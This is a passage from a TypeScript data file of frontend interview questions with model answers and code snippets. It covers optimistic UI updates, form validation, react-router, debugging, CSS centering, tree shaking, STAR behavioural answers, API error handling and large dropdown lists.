      relatedSlugs: ["caret-vs-tilde-package-json"],
      companyTags: [],
      estimatedReadingMinutes: 4,
      estimatedSolvingMinutes: 6,
    },
  },

  {
    title: "Optimistic vs pessimistic UI updates in React",
    aliases: ["optimistic vs pessimistic updates", "optimistic ui react"],
    question: {
      id: "optimistic-vs-pessimistic-updates",
      slug: "optimistic-vs-pessimistic-updates",
      title: "Optimistic vs pessimistic UI updates in React",
      category: "react",
      subcategory: "Data Mutations",
      tags: ["optimistic-ui", "useoptimistic", "mutations", "react"],
      difficulty: "medium",
      frequency: "high",
      seniority: "mid",
      shortDescription:
        "Pessimistic updates wait for the server before updating the UI (safe but slow). Optimistic updates change the UI first and roll back on failure (fast but needs careful rollback). React 19 ships `useOptimistic` to make this safe.",
      answer: `Two ways to handle a mutation:

- **Pessimistic** — disable the button, show a spinner, wait for the server, then update local state. The user sees the truth, but the UI stalls.
- **Optimistic** — apply the change to local state immediately, send the request in the background, and reconcile on response. If it fails, revert. The UI feels instant.

Use optimistic for actions where:
1. The success rate is high (likes, toggles, comments).
2. Failure is recoverable and visible (you can show a toast and revert).
3. The change is local (doesn't depend on a server-computed value like an ID until later).

Don't use optimistic for irreversible or financial actions (charges, deletes) — making the user think it succeeded when it didn't is worse than waiting.

React 19 / Next 14+ ships **\`useOptimistic\`** which gives you a "shadow state" that overlays the real state until the server action settles, then automatically merges or reverts. Before \`useOptimistic\`, libraries like React Query implemented this with \`onMutate\` / \`onError\` rollback.`,
      codeSnippets: [
        {
          language: "tsx",
          caption: "useOptimistic in React 19",
          code: `function Likes({ initial }: { initial: number }) {
  const [count, addLike] = useOptimistic(initial, (state) => state + 1);
  return (
    <form action={async () => {
      addLike();          // optimistic bump
      await like();       // server action; on error, count auto-reverts
    }}>
      <button>{count} ❤️</button>
    </form>
  );
}`,
        },
        {
          language: "tsx",
          caption: "Manual optimistic with React Query",
          code: `useMutation({
  mutationFn: addTodo,
  onMutate: async (newTodo) => {
    await qc.cancelQueries({ queryKey: ["todos"] });
    const prev = qc.getQueryData<Todo[]>(["todos"]);
    qc.setQueryData<Todo[]>(["todos"], (old = []) => [...old, newTodo]);
    return { prev };
  },
  onError: (_e, _newTodo, ctx) => qc.setQueryData(["todos"], ctx?.prev),
  onSettled: () => qc.invalidateQueries({ queryKey: ["todos"] }),
});`,
        },
      ],
      followUps: [
        "How do you correlate the server's real ID back to an optimistic temp ID?",
        "What happens if two optimistic updates race?",
        "How does useOptimistic interact with Server Actions and revalidation?",
      ],
      commonMistakes: [
        "Optimistic updates with no rollback path — UI silently desyncs from the server.",
        "Showing a spinner *and* doing optimistic — pick one.",
        "Optimistic deletion that the user can't undo when the server rejects.",
      ],
      performanceConsiderations: [
        "Optimistic UI is the cheapest perceived-perf win in many apps — measured INP improves dramatically.",
      ],
      edgeCases: [
        "Server returns a different shape than you optimistically wrote — must reconcile carefully.",
        "Race between two optimistic updates: queue them or use the server-returned state as source of truth on settle.",
      ],
      realWorldExamples: [
        "Linear, Notion, and modern social apps feel instant because almost every mutation is optimistic by default.",
      ],
      seniorDiscussion:
        "Senior signal: discuss conflict resolution (server returns 409), idempotency keys for retries, and the tradeoff between optimistic state and a single server-driven state model.",
      relatedSlugs: ["build-a-custom-fetch-hook"],
      companyTags: [],
      estimatedReadingMinutes: 6,
      estimatedSolvingMinutes: 15,
    },
  },

  {
    title: "Forms and validation in React",
    aliases: ["forms validation react", "handle forms react"],
    question: {
      id: "forms-and-validation-in-react",
      slug: "forms-and-validation-in-react",
      title: "How do you handle forms and validation in React?",
      category: "react",
      subcategory: "Forms",
      tags: ["forms", "validation", "react-hook-form", "zod", "react"],
      difficulty: "medium",
      frequency: "very-high",
      seniority: "mid",
      shortDescription:
        "Default to react-hook-form (uncontrolled, fast) + Zod (typed schema). Validate on blur for fields, on submit for the whole form, and surface errors next to inputs with proper aria attributes.",
      answer: `For a small form, \`useState\` per field is fine. Beyond ~5 fields you want a real form library — controlled-everything re-renders the entire form on every keystroke and validation logic gets messy.

The modern stack:

1. **react-hook-form** — uncontrolled-by-default. Registers refs, reads values on submit, isolates re-renders to dirty fields. Performance scales to 50+ fields without effort.
2. **Zod** (or Valibot, Yup) — declarative schema with TypeScript inference. The same schema can validate the request body on the server.
3. **\`@hookform/resolvers/zod\`** glues them.

Validation timing:
- **\`onBlur\`** for individual fields — gives the user a chance to finish typing.
- **\`onChange\`** after the first error — re-validate so they see the fix immediately.
- **\`onSubmit\`** for the whole form — last guard, plus server validation.

Accessibility:
- Every input has a \`<label>\` (clickable target).
- Errors are announced — \`aria-invalid\` on the input, \`aria-describedby\` pointing to the error text, an \`role="alert"\` summary on submit failure.
- Focus jumps to the first error on submit.

Server validation: never trust the client. Re-run the same schema on the API route. Surface server errors back into the same field-error shape the client uses.`,
      codeSnippets: [
        {
          language: "tsx",
          caption: "Typed form with react-hook-form + Zod",
          code: `const Schema = z.object({
  email: z.string().email(),
  password: z.string().min(8, "8+ chars"),
});
type Form = z.infer<typeof Schema>;

function Login() {
  const { register, handleSubmit, formState: { errors, isSubmitting } } =
    useForm<Form>({ resolver: zodResolver(Schema) });

  return (
    <form onSubmit={handleSubmit(login)} noValidate>
      <label>
        Email
        <input
          {...register("email")}
          aria-invalid={!!errors.email}
          aria-describedby="email-err"
        />
      </label>
      {errors.email && <p id="email-err" role="alert">{errors.email.message}</p>}
      <button disabled={isSubmitting}>Sign in</button>
    </form>
  );
}`,
        },
      ],
      followUps: [
        "Why does react-hook-form re-render less than a fully controlled form?",
        "How do you reuse a Zod schema between client and server?",
        "How do you handle async (server) validation like 'username taken'?",
      ],
      commonMistakes: [
        "Validating only on submit — the user finds out about every error at once.",
        "Disabling the submit button until valid — fights screen readers; show errors instead.",
        "Forgetting `noValidate` and getting browser tooltips that conflict with your custom messages.",
      ],
      performanceConsiderations: [
        "Controlled-everything forms re-render the whole tree per keystroke; uncontrolled isolates updates.",
      ],
      edgeCases: [
        "File inputs are always uncontrolled — `value` cannot be set programmatically (other than to clear).",
        "Date inputs differ across browsers; consider a controlled component only for dates.",
      ],
      realWorldExamples: [
        "Stripe Elements use uncontrolled iframes for PCI isolation — same pattern: ref-based read on submit.",
      ],
      seniorDiscussion:
        "Senior signal: discuss schema-driven UI (single source of truth), shared client/server validation, server-action progressive enhancement, and accessibility audit (focus order, error announcement, autocomplete attributes).",
      relatedSlugs: ["controlled-vs-uncontrolled-components"],
      companyTags: [],
      estimatedReadingMinutes: 6,
      estimatedSolvingMinutes: 20,
    },
  },

  {
    title: "Routing in React with react-router-dom",
    aliases: ["routing react", "react-router-dom", "client-side routing react"],
    question: {
      id: "routing-react-router-dom",
      slug: "routing-react-router-dom",
      title: "How do you implement routing in React with react-router-dom?",
      category: "react",
      subcategory: "Routing",
      tags: ["react-router", "routing", "spa", "react"],
      difficulty: "easy",
      frequency: "high",
      seniority: "junior",
      shortDescription:
        "Wrap the app in a router, declare routes (path → element), navigate with `<Link>` / `useNavigate`, read params via `useParams`/`useSearchParams`. v6+ supports nested routes, loaders, and data routers.",
      answer: `react-router-dom v6+ has two ways to declare routes:

1. **Element tree (\`<Routes>\`/\`<Route>\`)** — JSX-driven, simple.
2. **Data router (\`createBrowserRouter\`)** — config-driven, supports loaders/actions, best for new apps.

The hooks you'll touch:
- \`useNavigate()\` — programmatic navigation, replaces v5's \`history.push\`.
- \`useParams()\` — read URL segments (\`/users/:id\` → \`{ id }\`).
- \`useSearchParams()\` — read/write the query string.
- \`useLocation()\` — current URL incl. state.

Patterns to know:

- **Nested routes + \`<Outlet/>\`** for shared layouts.
- **Protected routes** — a wrapper that checks auth and redirects with \`<Navigate to="/login" replace />\`.
- **404** — a catch-all \`path="*"\` route.
- **Code splitting** — lazy + Suspense per route to keep the main bundle small.

In Next.js / Remix, you don't use react-router — file-system routing and the framework router replace it. Mention both worlds; senior interviewers often ask "would you use react-router or a framework router?" and want the tradeoff.`,
      codeSnippets: [
        {
          language: "tsx",
          caption: "v6 element tree with nested layout and protected route",
          code: `<BrowserRouter>
  <Routes>
    <Route path="/" element={<Layout />}>
      <Route index element={<Home />} />
      <Route path="dashboard" element={<RequireAuth><Dashboard/></RequireAuth>} />
      <Route path="users/:id" element={<UserPage />} />
      <Route path="*" element={<NotFound />} />
    </Route>
  </Routes>
</BrowserRouter>

function RequireAuth({ children }: { children: ReactNode }) {
  const user = useAuth();
  return user ? children : <Navigate to="/login" replace />;
}`,
        },
        {
          language: "tsx",
          caption: "Reading params + programmatic nav",
          code: `function User() {
  const { id } = useParams();
  const [params, setParams] = useSearchParams();
  const tab = params.get("tab") ?? "overview";
  const nav = useNavigate();
  return (
    <>
      <h1>User {id} — {tab}</h1>
      <button onClick={() => setParams({ tab: "settings" })}>Settings</button>
      <button onClick={() => nav("/", { replace: true })}>Home</button>
    </>
  );
}`,
        },
      ],
      followUps: [
        "What does the data router add over <Routes>?",
        "How does react-router differ from Next.js App Router?",
        "How do you preserve scroll position across navigation?",
      ],
      commonMistakes: [
        "Using `<a href>` for in-app navigation — full page reload, loses state.",
        "Forgetting `replace` on auth redirects — back button bounces the user back into the protected page.",
        "Putting a router inside a router (e.g. by accident) — leads to weird match behavior.",
      ],
      performanceConsiderations: [
        "Lazy-load route elements; the entire app shouldn't ship to render `/`.",
        "Use `<Link prefetch>`-style hover prefetch in your own router or framework where supported.",
      ],
      edgeCases: [
        "Trailing slashes — react-router doesn't normalize by default; either pick canonical URLs and redirect or accept both.",
        "Hash routing (`HashRouter`) bypasses server config but is bad for SEO; use only when you can't control the server.",
      ],
      realWorldExamples: [
        "Most CRA-based dashboards still use react-router. Greenfield SSR apps usually pick Next or Remix instead.",
      ],
      seniorDiscussion:
        "Senior signal: explain when to graduate from react-router to a framework, the loader/action data-flow model, and how SPA routing impacts SEO and analytics.",
      relatedSlugs: ["react-lazy-and-suspense"],
      companyTags: [],
      estimatedReadingMinutes: 6,
      estimatedSolvingMinutes: 12,
    },
  },

  {
    title: "How do you debug JavaScript and React applications effectively",
    aliases: ["debug javascript react", "react debugging tools"],
    question: {
      id: "debug-js-and-react-effectively",
      slug: "debug-js-and-react-effectively",
      title: "How do you debug JavaScript and React applications effectively?",
      category: "browser-internals",
      subcategory: "Debugging",
      tags: ["debugging", "devtools", "react", "performance", "logging"],
      difficulty: "medium",
      frequency: "high",
      seniority: "mid",
      shortDescription:
        "Reach for the right tool for the bug class: logical bugs → DevTools breakpoints + React DevTools; perf → Performance/Profiler; network → Network tab + replays; production → source maps, error tracking, Replay/Sentry.",
      answer: `A senior answer demonstrates a *taxonomy* — different bugs need different tools:

**Logical bugs**
- Chrome **Sources** panel, set breakpoints (line, conditional, logpoint) — far better than \`console.log\` once you know where to stop.
- **React DevTools** — inspect props/state, find which component re-rendered, profile renders.
- \`debugger;\` statement when you need to land in the call from a build.

**Performance**
- **Performance** panel for CPU/main-thread bottlenecks. Look for long tasks, layout thrash, GC.
- **React Profiler** — flame graph of commits, find why a parent re-rendered.
- **Lighthouse** + **Web Vitals** for end-user perception (LCP, INP, CLS).

**Network**
- **Network** tab — payload sizes, waterfalls, blocking requests.
- **Replays** (Sentry / FullStory) for "what did the user actually do" reproduction.

**Memory**
- Heap snapshots, allocation-timeline. Look for detached DOM, growing arrays, retained closures.

**Production**
- Source maps uploaded to error trackers (Sentry/Rollbar).
- Structured logging with correlation IDs across server/client.
- Feature flags to dark-launch and bisect regressions.

The mindset matters more than the tool: form a hypothesis, design a test that *invalidates* it, run it. Bugs that "happen sometimes" are state-dependent — capture the state, not just the symptom.`,
      codeSnippets: [
        {
          language: "ts",
          caption: "Logpoints — better than throwaway console.logs",
          code: `// In Chrome DevTools, right-click the gutter at any line:
//   Add logpoint → "rendered with id=" + id
// Console output appears without modifying source.`,
        },
      ],
      followUps: [
        "How do you debug a memory leak in a long-running SPA?",
        "How do you reproduce a bug that only happens for one user in production?",
        "What does the React Profiler tell you that DevTools doesn't?",
      ],
      commonMistakes: [
        "Throwing console.logs everywhere instead of setting a breakpoint with a condition.",
        "Profiling a debug build — measurements are dominated by dev-mode overhead.",
        "Treating React DevTools 'Highlight updates' as the source of truth — it shows commits, not wasted work.",
      ],
      performanceConsiderations: [
        "Recording the Performance panel on a slow-CPU emulation reveals issues that disappear on M-series Macs.",
      ],
      edgeCases: [
        "Strict Mode double-invokes effects in dev — looks like a bug, isn't.",
        "Source maps with code-mangling can mislead breakpoints; verify with the original file open.",
      ],
      realWorldExamples: [
        "Sentry + Replay reproduces a hydration mismatch by replaying the exact DOM before the error.",
      ],
      seniorDiscussion:
        "Senior signal: structured-logging + correlation IDs across services, Replay-style production debugging, and using feature flags + experiments to bisect regressions safely.",
      relatedSlugs: ["explain-memory-leaks-in-spas-and-how-to-debug-them"],
      companyTags: [],
      estimatedReadingMinutes: 6,
      estimatedSolvingMinutes: 12,
    },
  },

  {
    title: "Center a div inside a div",
    aliases: ["center a div", "center div inside div", "css centering"],
    question: {
      id: "center-a-div-inside-a-div",
      slug: "center-a-div-inside-a-div",
      title: "How would you center a div inside a div?",
      category: "css",
      subcategory: "Layout",
      tags: ["css", "flexbox", "grid", "layout", "centering"],
      difficulty: "easy",
      frequency: "very-high",
      seniority: "junior",
      shortDescription:
        "Modern answer: `display: grid; place-items: center;` on the parent, or `display: flex; justify-content: center; align-items: center;`. Both center a child along both axes in one rule.",
      answer: `Centering is the canonical CSS interview question — interviewers want to see fluency across modern and legacy techniques.

**Modern (use these):**

1. **Flexbox**
   \`\`\`css
   .parent { display: flex; justify-content: center; align-items: center; }
   \`\`\`
2. **Grid (shortest)**
   \`\`\`css
   .parent { display: grid; place-items: center; }
   \`\`\`
3. **Grid with explicit cell**
   \`\`\`css
   .parent { display: grid; }
   .child  { margin: auto; }
   \`\`\`

**Single-axis tricks:**

- \`margin: 0 auto;\` on a block-level child of known width — horizontal only.
- \`text-align: center;\` for inline/inline-block children — horizontal only.

**Legacy (mention if relevant):**

- Absolute positioning + transform:
  \`\`\`css
  .parent { position: relative; }
  .child  {
    position: absolute; top: 50%; left: 50%;
    transform: translate(-50%, -50%);
  }
  \`\`\`
  Useful when the parent isn't flex/grid (e.g. centering inside a fixed background image).

Which to pick: default to grid \`place-items: center\` — shortest, most modern, browser-supported everywhere. Use flex if you also need to control wrapping or order.`,
      codeSnippets: [
        {
          language: "css",
          caption: "All four techniques side-by-side",
          code: `/* Flex */
.flex   { display: flex; justify-content: center; align-items: center; }

/* Grid (shortest) */
.grid   { display: grid; place-items: center; }

/* Margin auto inside a grid */
.gauto  { display: grid; }
.gauto > * { margin: auto; }

/* Absolute + transform (no flex/grid) */
.abs    { position: relative; }
.abs > .child {
  position: absolute; top: 50%; left: 50%;
  transform: translate(-50%, -50%);
}`,
        },
      ],
      followUps: [
        "What's the difference between `align-items` and `align-content`?",
        "How do you center the LAST flex item to the right while the rest are centered?",
        "Why does `margin: auto` work for horizontal centering but not vertical (in normal flow)?",
      ],
      commonMistakes: [
        "Using `text-align: center` for non-text children and being surprised it doesn't center them.",
        "Forgetting that `margin: 0 auto` needs an explicit width on the child.",
        "Stacking `transform: translate(-50%, -50%)` plus a flex parent and double-centering.",
      ],
      performanceConsiderations: [
        "All these are zero-cost layout primitives. Avoid `transform` on huge subtrees only because it can promote to its own layer.",
      ],
      edgeCases: [
        "RTL languages — `justify-content: flex-start` is start-of-line, not 'left'. Prefer logical properties (`margin-inline`).",
        "Centering a child that's bigger than the parent overflows; pair with `min-width: 0; min-height: 0;` to allow shrinking.",
      ],
      realWorldExamples: [
        "Modal/overlay layouts almost always use flex/grid centering on the backdrop.",
      ],
      seniorDiscussion:
        "Senior signal: discuss intrinsic vs extrinsic sizing, container queries for responsive centering, and accessibility implications of centered content (line length, focus order).",
      relatedSlugs: [],
      companyTags: [],
      estimatedReadingMinutes: 4,
      estimatedSolvingMinutes: 6,
    },
  },

  {
    title: "Tree shaking and bundling in modern JavaScript applications",
    aliases: ["tree shaking", "tree shaking bundling"],
    question: {
      id: "tree-shaking-and-bundling",
      slug: "tree-shaking-and-bundling",
      title: "Tree shaking and bundling — how do they work?",
      category: "performance",
      subcategory: "Bundling",
      tags: ["tree-shaking", "esm", "bundling", "webpack", "rollup", "vite"],
      difficulty: "medium",
      frequency: "high",
      seniority: "mid",
      shortDescription:
        "Tree shaking is dead-code elimination over ES modules. Static `import`/`export` syntax lets bundlers analyze the dependency graph and drop exports nothing imports. Side effects (or `sideEffects: false`) decide what's safely removable.",
      answer: `**Bundling** packs your modules + dependencies into one or more files the browser can load efficiently (fewer HTTP requests, shared code split into chunks).

**Tree shaking** is dead-code elimination *across modules*: if a module exports A, B, C and only A is imported anywhere in the graph, B and C never reach the bundle.

It works because **ESM is statically analyzable**:
- \`import { x } from "./m"\` is resolvable at parse time — no runtime branches, no \`require()\` returning different shapes.
- The bundler builds a graph of *what's exported* vs *what's actually imported* and drops the rest.

What kills tree shaking:
1. **CommonJS** (\`require\`/\`module.exports\`) — dynamic by design; bundlers can't reason about which exports are used.
2. **Side effects on import** — \`import "./styles.css"\` registers global CSS; even if no symbol is used, the import must run. Mark side-effect-free packages with \`"sideEffects": false\` in their \`package.json\`.
3. **Re-exports through barrel files** — \`export * from "./big-file"\` can pull large surfaces unless re-exports are themselves marked as ESM with side-effect annotations.
4. **\`/*#__PURE__*/\` annotations missing** — toplevel function calls that return values are assumed to have side effects; bundlers need a hint to drop them.

Bundler flavors:
- **Webpack** — workhorse; tree shaking via \`UglifyJS\`/\`Terser\` with \`sideEffects\` field.
- **Rollup** — pioneered ES-module tree shaking; great for libraries.
- **esbuild / SWC** — fast, used by Vite under the hood.
- **Vite** — dev uses native ESM (no bundling); prod uses Rollup.`,
      codeSnippets: [
        {
          language: "ts",
          caption: "ESM tree-shakable",
          code: `// math.ts
export const sum = (a: number, b: number) => a + b;
export const huge = () => /* 200KB of stuff */ {};

// app.ts
import { sum } from "./math";
sum(1, 2);
// Bundled output drops 'huge'`,
        },
        {
          language: "ts",
          caption: "Mark a package side-effect-free in package.json",
          code: `{
  "name": "my-lib",
  "sideEffects": false,
  "exports": "./dist/index.js"
}

// Or list specific files that DO have side effects:
// "sideEffects": ["./dist/polyfills.js", "*.css"]`,
        },
      ],
      followUps: [
        "Why doesn't tree shaking work on CommonJS imports?",
        "What does `\"sideEffects\": false` in package.json actually do?",
        "How does Vite's dev server avoid bundling, and why is that fast?",
      ],
      commonMistakes: [
        "Importing a default export of a CJS package and assuming tree shaking works.",
        "A barrel file (`index.ts` re-exporting everything) defeats granular imports unless side-effect hints are right.",
        "Forgetting that CSS imports always have side effects — tree shaking won't strip styles.",
      ],
      performanceConsiderations: [
        "Tree shaking primarily reduces *bundle size* (LCP, parse time). It doesn't help runtime CPU.",
      ],
      edgeCases: [
        "Class methods can't be tree-shaken individually — the class is one unit.",
        "TypeScript decorators / metadata may force a method to be retained for runtime reflection.",
      ],
      realWorldExamples: [
        "lodash-es is tree-shakable; importing `{ debounce }` ships ~2KB instead of lodash's ~70KB.",
      ],
      seniorDiscussion:
        "Senior signal: discuss module-graph analysis, why mode='production' enables Terser, the role of `__PURE__` annotations, and how bundlers compose with route-level code splitting.",
      relatedSlugs: ["how-do-you-reduce-bundle-size-in-production"],
      companyTags: [],
      estimatedReadingMinutes: 6,
      estimatedSolvingMinutes: 12,
    },
  },

  {
    title: "Behavioral — handle conflicts, deadlines, ownership (STAR)",
    aliases: ["behavioral conflict deadline", "star method behavioral"],
    question: {
      id: "behavioral-star-conflict-deadline-ownership",
      slug: "behavioral-star-conflict-deadline-ownership",
      title: "Behavioral interviews — how do you answer conflict, deadline, and ownership questions?",
      category: "behavioral",
      subcategory: "Communication",
      tags: ["behavioral", "star", "leadership", "conflict-resolution"],
      difficulty: "medium",
      frequency: "very-high",
      seniority: "mid",
      shortDescription:
        "Use STAR (Situation, Task, Action, Result). Bias toward your specific actions, quantify outcomes, and be honest about tradeoffs. Have 4–6 stories prepped that you can flex across most behavioral prompts.",
      answer: `Behavioral rounds (often called Manager, Hiring Manager, Bar Raiser, or Values rounds) are evaluating **signal**, not storytelling. Interviewers map what you say to a rubric: ownership, communication, conflict resolution, scope management, mentorship, dealing with ambiguity, recovering from failure. They are looking for evidence that your **judgment under pressure** matches the level you're applying to. A polished story with no signal beneath it scores worse than an honest, slightly messy story with concrete actions and learnings.

**The framework: STAR.**

- **Situation** — context in 1–2 sentences. What was the project, the team, the constraint? Don't spend three minutes setting the stage; the interviewer wants the conflict.
- **Task** — your specific responsibility. Use **I**, not **we**. If you say "we decided to migrate," the interviewer can't tell what you did. "I drove the migration RFC, ran the eng review, and owned the rollout plan" is unambiguous.
- **Action** — the specific things you did. This is the *bulk* of the answer (≥60% of speaking time). Walk through your decisions, the alternatives you considered, the trade-offs, and the people you collaborated with.
- **Result** — measurable outcome with numbers. "p95 dropped from 800ms → 120ms over 3 weeks; conversion +30% on the touched flow; the on-call paging volume halved." Anchor results in business impact when you can.

**Preparation playbook:**

1. **List 4–6 projects** you led or contributed to materially. Prefer recent (last 18 months), substantial (a quarter or more), and high-stakes.
2. For each, extract one story per dimension: **conflict**, **ambiguity**, **failure**, **mentorship**, **ownership**, **scope cut**, **technical depth**, **stakeholder push-back**, **cross-team collaboration**, **hiring/firing/feedback**.
3. Write each story as STAR notes: 4–6 bullets that you can speak from. Don't memorize prose; you'll sound rehearsed.
4. **Practice at 90–120 seconds.** Longer drains attention; shorter feels shallow. The interviewer will follow up if they want more depth — that's a good sign.
5. **Have numbers.** "Faster" is forgettable; "p95 dropped from 800ms → 120ms" is interview gold. If you don't have exact numbers, give honest ranges ("roughly halved", "single-digit % conversion lift") — never invent precision.
6. **Anticipate follow-ups.** For every story, expect: "What would you do differently?", "What was the hardest part?", "What was your manager's view?", "How did you measure success?"

**Common dimensions and what interviewers want to hear:**

- **Conflict** — show you sought to *understand the other side first*, found a shared goal, surfaced the trade-off explicitly, and converged on a decision (even if it wasn't yours). **Don't** paint your counterpart as wrong or unreasonable; the interviewer will assume you'll do the same to them. Senior signal: "I changed my mind because…" or "We agreed to disagree and committed to X — they were right that…".
- **Tight deadlines** — you *scoped*, *communicated risk early*, made cut decisions with the PM, didn't burn the team out. Bad signal: heroic 80-hour weeks with no acknowledgment that those weren't sustainable.
- **Failure** — pick a *real* one. Articulate (a) what happened, (b) what *you* did wrong (not just bad luck), (c) the lesson, (d) how you've applied that lesson since. "I didn't really fail" is a red flag for senior loops — it suggests you don't reflect.
- **Ownership** — what did you build, decide, or fix *without being asked*? What problem did you adopt? What was broken that you noticed before others did? Going from IC → senior is about expanding what you consider "your problem."
- **Mentorship** — concrete: who, what skill, over what time horizon, what did they do that they couldn't before, what feedback did you give them. "I helped them grow" with no specifics signals you don't actually mentor.
- **Ambiguity** — describe a problem with no clear right answer; explain how you broke it down, what data you sought, what hypothesis you tested first, when you decided "good enough."
- **Disagreeing with your manager** — show that you challenged respectfully with data, made your case once, and committed when overruled. Then follow up: did you end up right or wrong, and what did you learn?

**Tactical do's and don'ts:**

- **Do** name the **trade-off** explicitly — "we chose X over Y because…"
- **Do** show **what changed in you** as a result of the project — that's evidence of growth.
- **Do** use the interviewer's company values as a guide — Amazon's LP, Meta's "move fast," Google's "respect the user" — but don't quote them verbatim.
- **Don't** say "we" when the interviewer wants to know what *you* did.
- **Don't** bury the result. End on the metric or outcome, not on "and then it shipped."
- **Don't** pick trivial conflicts ("disagreed about a button color") for senior loops; pick consequential ones (architectural choice, hire/no-hire, scope cut affecting a deadline).
- **Don't** reuse the same project for every prompt — interviewers compare notes and notice breadth.

**The honesty-vs-polish balance.** Senior interviewers can smell a rehearsed story from 30 seconds in. The best signal you can give is: a slightly imperfect telling of a real story, with concrete actions, a measurable result, and an honest reflection. The worst signal is a flawlessly polished story with no specific actions, no numbers, and no admission of mistakes.

**Final note: this is a two-way interview.** Use the time to ask the interviewer how they handle conflict on their team, how performance is calibrated, what's hardest about working there. The data you gather is at least as valuable as the signal you give.`,
      codeSnippets: [],
      followUps: [
        "Tell me about a time you disagreed with your manager.",
        "Describe a project that didn't go as planned.",
        "Walk me through how you mentored someone junior.",
      ],
      commonMistakes: [
        "Saying 'we' when the interviewer wants to know what *you* did.",
        "Burying the result — leaving the panel guessing whether it worked.",
        "Picking trivial conflicts ('disagreed about a button color') for senior loops.",
      ],
      performanceConsiderations: [
        "Time-box answers to ~2 minutes; the panel will dig in if they want more depth.",
      ],
      edgeCases: [
        "Manager rounds skew toward leadership/ownership; values rounds skew toward culture-fit prompts.",
        "Don't reuse the same project for every prompt — show breadth.",
      ],
      realWorldExamples: [
        "Amazon's Leadership Principles loop is the most STAR-driven; many companies have adopted similar rubrics.",
      ],
      seniorDiscussion:
        "Senior signal: discuss tradeoffs explicitly (cost, time, risk), name stakeholders, show you can lead without authority, and demonstrate how you scale your judgment via mentorship and process.",
      relatedSlugs: [],
      companyTags: [],
      estimatedReadingMinutes: 5,
      estimatedSolvingMinutes: 5,
    },
  },

  {
    title: "Implement API calls and error handling in React",
    aliases: ["api calls error handling react", "fetch api react"],
    question: {
      id: "api-calls-and-error-handling-in-react",
      slug: "api-calls-and-error-handling-in-react",
      title: "How do you implement API calls and error handling in React?",
      category: "react",
      subcategory: "Data Fetching",
      tags: ["fetch", "data-fetching", "error-handling", "react-query", "react"],
      difficulty: "medium",
      frequency: "very-high",
      seniority: "mid",
      shortDescription:
        "Centralize the fetch in a typed wrapper that throws on non-2xx, normalize errors into a discriminated union, and surface them via a state machine. For real apps reach for React Query / SWR which solve cache, dedupe, retry, focus revalidation.",
      answer: `A solid answer breaks the question into layers:

**1. The HTTP layer**
A thin wrapper that:
- Throws on non-2xx (raw \`fetch\` doesn't).
- Parses JSON only when the response says so.
- Adds tracing/auth headers once.
- Returns a typed result.

**2. The state layer**
Don't sprinkle three booleans (\`loading\`, \`data\`, \`error\`) — they can disagree. Use a tagged union (\`{ status: 'idle' | 'loading' | 'success' | 'error', ... }\`). Hooks like \`useReducer\` make this clean. Better: React Query / SWR, which give you cache, dedupe, retry, focus revalidation, and SSR hydration for free.

**3. The error UX**
- **Validation errors** (4xx) — show inline, next to the field.
- **Server errors** (5xx) — show a retry button, log to Sentry.
- **Network failures** — distinguish from server errors; suggest checking connection.
- **Auth errors** (401) — redirect to login, preserve current URL.

**4. Cancellation**
Always pass an \`AbortController\` so component unmount or arg change cancels stale requests — otherwise an old response can overwrite fresh data.

**5. Retry strategy**
Exponential backoff for transient errors. Don't retry on 4xx (except 408/429). Cap attempts. React Query handles this with one option.`,
      codeSnippets: [
        {
          language: "ts",
          caption: "Typed fetch wrapper with normalized errors",
          code: `export class ApiError extends Error {
  constructor(public status: number, public body: unknown) { super(\`HTTP \${status}\`); }
}

export async function api<T>(url: string, init?: RequestInit): Promise<T> {
  const res = await fetch(url, {
    headers: { "content-type": "application/json", ...init?.headers },
    ...init,
  });
  if (!res.ok) {
    const body = await res.json().catch(() => null);
    throw new ApiError(res.status, body);
  }
  return res.json();
}`,
        },
        {
          language: "tsx",
          caption: "Use it inside React Query",
          code: `function User({ id }: { id: string }) {
  const { data, error, isLoading } = useQuery({
    queryKey: ["user", id],
    queryFn: () => api<User>(\`/api/users/\${id}\`),
    retry: (count, err) => err instanceof ApiError && err.status >= 500 && count < 3,
  });

  if (isLoading) return <Skeleton />;
  if (error)     return <RetryError error={error} />;
  return <Card user={data!} />;
}`,
        },
      ],
      followUps: [
        "How do you handle 401 globally without scattering redirects?",
        "How does React Query's `staleTime` differ from `cacheTime`?",
        "How do you avoid the 'request waterfall' problem?",
      ],
      commonMistakes: [
        "Treating `fetch` as throwing on HTTP errors — it doesn't, only on network failure.",
        "Swallowing errors with `.catch(() => null)` — silent failures rot the codebase.",
        "Not cancelling on unmount — old responses overwrite fresh data.",
      ],
      performanceConsiderations: [
        "Dedupe identical in-flight requests (`queryKey` in React Query) — page renders that share data only fetch once.",
        "Stream JSON for big payloads via `Response.body` to start rendering before the full payload arrives.",
      ],
      edgeCases: [
        "Empty 204 responses — don't call `.json()`; check status first.",
        "CORS preflights add a round trip; consider simple requests when possible.",
      ],
      realWorldExamples: [
        "TanStack Query is the de-facto answer for client data fetching; it solves all five layers above.",
      ],
      seniorDiscussion:
        "Senior signal: discuss request cancellation strategy, retry/backoff policies, idempotency keys for safe retries, and the data layer (RSC, server actions, GraphQL clients) one level up.",
      relatedSlugs: ["build-a-custom-fetch-hook"],
      companyTags: [],
      estimatedReadingMinutes: 7,
      estimatedSolvingMinutes: 18,
    },
  },

  {
    title: "Render 5000 records in a dropdown efficiently",
    aliases: ["5000 records dropdown", "virtualize dropdown", "large list dropdown"],
    question: {
      id: "render-5000-records-dropdown-efficiently",
      slug: "render-5000-records-dropdown-efficiently",
      title: "If an API returns 5000 records, how do you display them efficiently in a dropdown?",
      category: "performance",
      subcategory: "Virtualization",
      tags: ["virtualization", "dropdown", "performance", "search", "ux"],
      difficulty: "medium",
      frequency: "high",
      seniority: "mid",
      shortDescription:
        "Don't render 5000 DOM nodes. Combine: server-side search/pagination, async incremental load, virtualization (react-window / TanStack Virtual), and a debounced filter input. Most apps need only the last three; large lists need all four.",
      answer: `Rendering 5000 \`<option>\` or \`<li>\` nodes destroys layout/paint and is unusable on mobile. The combined fix:

1. **Search-first, list-second.** Most users want one of a handful of items. Render an input that filters the list — the dropdown only shows ~20 matches. Combobox UX (downshift, headlessui Combobox) is the right primitive.
2. **Virtualization.** Even with filtering, the worst case is "no filter" — 5000 rows. Render only the visible window plus a small overscan. Use \`react-window\` or \`@tanstack/react-virtual\`.
3. **Server-side pagination/search.** If the dataset can grow, push search to the server and stream the next page on scroll. Don't bring 5000 back to the client when you'll show 20.
4. **Debounce input.** 200–300ms keeps typing fluid; without it you re-filter 5000 records per keystroke.
